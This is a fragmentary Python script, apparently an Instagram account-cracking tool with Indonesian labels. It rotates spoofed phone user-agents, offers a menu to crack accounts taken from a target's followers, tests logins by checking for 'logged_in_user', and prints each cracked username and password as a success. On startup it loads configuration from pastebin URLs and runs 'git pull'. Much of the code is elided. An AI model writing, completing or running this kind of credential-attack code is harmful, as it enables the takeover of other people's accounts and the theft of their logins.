...
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone12,1; iOS 15_5; en_US; en-US; scale=2.00; 828x1792; 382468104)"
...
\t  {J2}░        ░ ░ ░         ░           ░  ░░ ░      ░  ░   
\t  {J2}           ░                           ░"""
	sol().print(nel(au,style=f'{color_table}', subtitle=f'{P2}Author Jodohmu',title=f'{P2}{waktu()}'))
def loadinglisen():
...
[white][[blue]03[white]]. Crack Dari Mengikuti           [white][[red]E[white]]. [red]LogOut """,title=f"[{P2} Pilihan Menu {hapus}]",width=80,padding=(0,4),style=f"{color_table}"))
	...
	def ua_igeh(self):
		...
		rel=rc(["SM-J120H","SM-J120F","SM-J120M","SM-J111M","SM-J111F","SM-J110H","SM-J110G","SM-J110F","SM-J110M","SM-J105H","SM-J105Y","SM-J105B","SM-J106H","SM-J106F","SM-J106B","SM-J106M","SM-J200F","SM-J200M"])
		me=rc(["RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925", "RMX1929","RMX2001","RMX2061"])
				...
				try:
					...
					if "logged_in_user" in str(ncek):
						...
						try:
							...
							print("")
							prints(Panel(f'\rUsername  : {H2}{user}                \n{P2}[{H2}💉{P2}] Password  : {H2}{pw}',title=f"{H2} •• SUCCESS ••",width=80,padding=(0,4),style=""))
							print("")
...
if __name__=='__main__':
	...
	try:
		with requests.Session() as ses:
	         ko = ses.get('https://pastebin.com/raw/ZQDL26pE').json()
	         HARIS.update(ko)
	         ki = ses.get('https://pastebin.com/raw/8NiC5ayu').json()
	         HARIS1.update(ki)
	         os.system("git pull")
	         login_kamu()
	except Exception as e:
